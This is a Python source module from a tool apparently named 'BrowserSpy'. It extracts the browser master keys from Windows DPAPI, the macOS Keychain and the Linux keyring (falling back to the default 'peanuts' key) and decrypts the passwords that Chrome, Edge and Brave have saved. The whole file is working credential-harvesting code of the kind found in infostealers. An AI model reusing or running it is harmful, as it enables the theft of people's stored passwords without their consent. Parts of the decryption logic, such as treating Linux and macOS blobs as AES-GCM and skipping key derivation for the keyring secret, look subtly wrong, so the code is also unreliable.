"""
BrowserSpy — Cryptographic helpers.
Handles AES-GCM decryption of Chrome/Edge/Brave saved passwords on Linux and macOS.
On Windows, DPAPI is used via pywin32 (optional).
"""

import os
import sys
import json
import base64
import logging
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

# ─── Optional imports ─────────────────────────────────────────────────────────

try:
    from Crypto.Cipher import AES  # pycryptodome

    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False
    logger.warning("pycryptodome not installed — password decryption unavailable.")

try:
    import secretstorage  # Linux keyring (optional)

    HAS_SECRETSTORAGE = True
except ImportError:
    HAS_SECRETSTORAGE = False

try:
    import win32crypt  # Windows DPAPI (pywin32)

    HAS_WIN32 = True
except ImportError:
    HAS_WIN32 = False


# ─── Chrome/Edge/Brave — Linux ────────────────────────────────────────────────

_CHROME_LINUX_SAFE_STORAGE_KEY: Optional[bytes] = None

CHROME_LINUX_FALLBACK_KEY = b"peanuts"  # Chromium default on Linux


def _get_linux_master_key() -> bytes:
    """
    Retrieve the Chrome Safe Storage encryption key from the Linux system keyring.
    Falls back to the hardcoded Chromium default ('peanuts') if unavailable.

    Returns:
        The raw encryption key bytes.
    """
    global _CHROME_LINUX_SAFE_STORAGE_KEY
    if _CHROME_LINUX_SAFE_STORAGE_KEY is not None:
        return _CHROME_LINUX_SAFE_STORAGE_KEY

    if HAS_SECRETSTORAGE:
        try:
            bus = secretstorage.dbus_init()
            collection = secretstorage.get_default_collection(bus)
            for item in collection.get_all_items():
                if item.get_label() == "Chrome Safe Storage":
                    key = item.get_secret()
                    _CHROME_LINUX_SAFE_STORAGE_KEY = key
                    return key
        except Exception as exc:
            logger.debug("secretstorage lookup failed: %s", exc)

    # Fallback: derive a key from the well-known default
    _CHROME_LINUX_SAFE_STORAGE_KEY = _derive_key(CHROME_LINUX_FALLBACK_KEY)
    return _CHROME_LINUX_SAFE_STORAGE_KEY


def _derive_key(password: bytes, salt: bytes = b"saltysalt", iterations: int = 1, key_length: int = 16) -> bytes:
    """
    Derive an AES key using PBKDF2-HMAC-SHA1 — the method used by Chromium on Linux/macOS.

    Args:
        password: Base password bytes.
        salt: Salt value (Chromium uses 'saltysalt').
        iterations: Number of PBKDF2 iterations (1 on Linux, 1003 on macOS).
        key_length: Desired key length in bytes (16 for AES-128).

    Returns:
        Derived key bytes.
    """
    import hashlib

    return hashlib.pbkdf2_hmac("sha1", password, salt, iterations, dklen=key_length)


# ─── Chrome/Edge/Brave — macOS ────────────────────────────────────────────────


def _get_macos_master_key(browser: str = "Chrome") -> bytes:
    """
    Retrieve the browser's Safe Storage password from the macOS Keychain using the
    'security' command-line tool and derive the AES-128 key.

    Args:
        browser: Browser name string (e.g., 'Chrome', 'Edge', 'Brave').

    Returns:
        Derived AES-128 key bytes.
    """
    import subprocess

    service_map = {
        "chrome": "Chrome Safe Storage",
        "edge": "Microsoft Edge Safe Storage",
        "brave": "Brave Safe Storage",
    }
    service = service_map.get(browser.lower(), "Chrome Safe Storage")

    try:
        result = subprocess.run(
            ["security", "find-generic-password", "-s", service, "-w"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        password = result.stdout.strip().encode()
    except Exception as exc:
        logger.debug("macOS keychain lookup failed: %s", exc)
        password = b"peanuts"

    return _derive_key(password, iterations=1003)


# ─── Chrome/Edge/Brave — Windows ──────────────────────────────────────────────


def _get_windows_master_key(local_state_path: Path) -> Optional[bytes]:
    """
    Retrieve and decrypt the Chrome/Edge/Brave 'os_crypt.encrypted_key' from the
    Local State file using Windows DPAPI.

    Args:
        local_state_path: Path to the 'Local State' file in the browser profile directory.

    Returns:
        Decrypted AES-256 key bytes, or None on failure.
    """
    if not HAS_WIN32:
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # strip "DPAPI" prefix
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as exc:
        logger.debug("Windows DPAPI key retrieval failed: %s", exc)
        return None


# ─── Password decryption dispatch ─────────────────────────────────────────────


def decrypt_chrome_password(
    encrypted_value: bytes,
    master_key: Optional[bytes] = None,
    local_state_path: Optional[Path] = None,
    browser: str = "chrome",
) -> str:
    """
    Decrypt a Chrome/Edge/Brave encrypted password blob.

    The blob format is:
      - v10 or v11 prefix (3 bytes): AES-256-GCM encrypted (Chromium modern)
      - No prefix: DPAPI encrypted (Windows legacy)

    Args:
        encrypted_value: Raw bytes from the 'Login Data' SQLite database.
        master_key: Pre-loaded AES master key (Windows). If None, derived from OS.
        local_state_path: Path to 'Local State' file for Windows key extraction.
        browser: Browser identifier for key lookup on macOS.

    Returns:
        Decrypted password as a string, or a placeholder on failure.
    """
    if not encrypted_value:
        return ""

    if not HAS_CRYPTO:
        return "[crypto library missing]"

    try:
        # ── Modern Chromium v10/v11 AES-GCM ──────────────────────────────────
        if encrypted_value[:3] in (b"v10", b"v11"):
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]

            if master_key is None:
                platform = sys.platform
                if platform == "win32":
                    if local_state_path:
                        master_key = _get_windows_master_key(local_state_path)
                    if not master_key:
                        return "[DPAPI key unavailable]"
                elif platform == "darwin":
                    master_key = _get_macos_master_key(browser)
                else:
                    master_key = _get_linux_master_key()

            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
            decrypted = cipher.decrypt(payload[:-16])
            return decrypted.decode("utf-8", errors="replace")

        # ── Legacy Windows DPAPI ──────────────────────────────────────────────
        elif sys.platform == "win32" and HAS_WIN32:
            decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
            return decrypted.decode("utf-8", errors="replace")

        else:
            return "[unknown encryption format]"

    except Exception as exc:
        logger.debug("Password decryption failed: %s", exc)
        return "[decryption failed]"


def get_chrome_master_key(user_data_dir: Path, browser: str = "chrome") -> Optional[bytes]:
    """
    Load and return the AES master key for a Chromium-based browser.

    Args:
        user_data_dir: Path to the browser's 'User Data' directory.
        browser: Browser name string (used for macOS keychain label).

    Returns:
        AES master key bytes, or None if unavailable.
    """
    platform = sys.platform
    if platform == "win32":
        local_state = user_data_dir / "Local State"
        return _get_windows_master_key(local_state)
    elif platform == "darwin":
        return _get_macos_master_key(browser)
    else:
        return _get_linux_master_key()
